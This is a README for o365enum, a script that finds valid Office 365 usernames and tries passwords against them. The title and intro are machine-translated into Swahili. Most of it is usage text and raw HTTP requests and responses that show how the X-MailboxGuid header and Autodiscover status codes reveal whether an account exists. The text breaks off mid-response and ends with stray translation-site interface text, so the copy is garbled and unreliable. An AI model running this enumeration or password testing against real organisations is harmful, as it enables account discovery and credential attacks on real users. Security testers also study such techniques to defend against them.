# Ofisi ya Watumiaji 365

Hesabu majina ya watumiaji halali kutoka Ofisi 365 ukitumia ActiveSync, Autodiscover, au ukurasa wa kuingia wa office.com.

## Usage

o365enum will read usernames from the file provided as first parameter. The file should have one username per line. The output is CSV-based for easier parsing. Valid status can be 0 (invalid user), 1 (valid user), 2 (valid user and valid password).

```
python3.6 o365enum.py -h
usage: o365enum.py [-h] -u USERLIST [-p PASSWORD] [-n NUM] [-v]
                   [-m {activesync,autodiscover,office.com}]

Office365 User Enumeration Script

optional arguments:
  -h, --help            show this help message and exit
  -u USERLIST, --userlist USERLIST
                        username list one per line (default: None)
  -p PASSWORD, --password PASSWORD
                        password to try (default: Password1)
  -n NUM, --num NUM     # of reattempts to remove false negatives (default: 3)
  -v, --verbose         Enable verbose output at urllib level (default: False)
  -m {activesync,autodiscover,office.com}, --method {activesync,autodiscover,office.com}
                        method to use (default: activesync)
```

Example run:

```
./o365enum.py -u users.txt -p Password2 -n 1 -m activesync
username,valid
nonexistent@contoso.com,0
existing@contoso.com,1
```

## Enumeration Methods

### ActiveSync Enumeration

This method is based on grimhacker's [method](https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/) that sends Basic HTTP authentication requests to ActiveSync endpoint. However, **checking the status code no longer works given that Office365 returns a 401 whether the user exists or not**.

Instead, we send the same request but check for a custom HTTP response header (`X-MailboxGuid`) presence to identify whether a username is valid or not.

#### Existing Account

The request below contains the following Base64 encoded credentials in the Authorization header: valid_user@contoso.com:Password1

```
OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1
Host: outlook.office365.com
Connection: close
MS-ASProtocolVersion: 14.0
Content-Length: 0
Authorization: Basic dmFsaWRfdXNlckBjb250b3NvLmNvbTpQYXNzd29yZDE=
```


This elicits the following response ("401 Unauthorized") with the `X-MailboxGuid` header set, indicating that the username is valid but the password is not:

```
Date: Fri, 31 Jan 2020 13:02:46 GMT
Connection: close
HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
request-id: d494a4bc-3867-436a-93ef-737f9e0522eb
X-CalculatedBETarget: AM0PR09MB2882.eurprd09.prod.outlook.com
X-BackEndHttpStatus: 401
X-RUM-Validated: 1
X-MailboxGuid: aadaf467-cd08-4a23-909b-9702eca5b845 <--- This header leaks the account status (existing)
X-DiagInfo: AM0PR09MB2882
X-BEServer: AM0PR09MB2882
X-Proxy-RoutingCorrectness: 1
X-Proxy-BackendServerStatus: 401
X-Powered-By: ASP.NET
X-FEServer: AM0PR06CA0096
WWW-Authenticate: Basic Realm="",Negotiate
Date: Fri, 31 Jan 2020 13:02:46 GMT
Connection: close

--snip--
```

#### Nonexistent Account

The request below contains the following Base64 encoded credentials in the Authorization header: invalid_user@contoso.com:Password1

```
OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1
Host: outlook.office365.com
Connection: close
MS-ASProtocolVersion: 14.0
Content-Length: 2
Authorization: Basic aW52YWxpZF91c2VyQGNvbnRvc28uY29tOlBhc3N3b3JkMQ==
```

This elicits the following response ("401 Unauthorized" but this time without the `X-MailboxGuid` header, indicating the username is invalid.

```
HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
request-id: 2944dbfc-8a1e-4759-a8a2-e4568950601d
X-CalculatedFETarget: DB3PR0102CU001.internal.outlook.com
X-BackEndHttpStatus: 401
WWW-Authenticate: Basic Realm="",Negotiate
X-FEProxyInfo: DB3PR0102CA0017.EURPRD01.PROD.EXCHANGELABS.COM
X-CalculatedBETarget: DB7PR04MB5452.eurprd04.prod.outlook.com
X-BackEndHttpStatus: 401
X-RUM-Validated: 1
X-DiagInfo: DB7PR04MB5452
X-BEServer: DB7PR04MB5452
X-Proxy-RoutingCorrectness: 1
X-Proxy-BackendServerStatus: 401
X-FEServer: DB3PR0102CA0017
X-Powered-By: ASP.NET
X-FEServer: AM0PR04CA0024
Date: Fri, 31 Jan 2020 16:19:11 GMT
Connection: close

--snip--
```

### Autodiscover Enumeration

The autodiscover endpoint allows for user enumeration without an authentication attempt. The endpoint returns a 200 status code if the user exists and a 302 if the user does not exists (unless the redirection is made to an on-premise Exchange server).

#### Existing User

```
GET /autodiscover/autodiscover.json/v1.0/existing@contoso.com?Protocol=Autodiscoverv1 HTTP/1.1
Host: outlook.office365.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
MS-ASProtocolVersion: 14.0
```

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 97
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: fee7f899-7115-43da-9d34-d3ee19920a89
X-CalculatedBETarget: AM0PR09MB2882.eurp 
More about this source textSource text required for additional translation information
Send feedback
Side panels
History
Saved
Contribute
